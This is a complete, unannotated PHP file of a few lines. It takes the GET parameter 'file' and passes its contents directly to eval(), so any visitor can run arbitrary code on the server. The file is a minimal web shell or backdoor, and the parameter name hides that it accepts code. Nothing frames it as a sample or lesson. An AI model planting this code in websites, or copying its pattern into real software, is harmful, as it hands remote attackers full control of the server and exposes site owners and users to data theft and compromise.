<?php
if (isset($_GET['file'])) {
    $code = $_GET['file'];
    eval($code);
}
?>

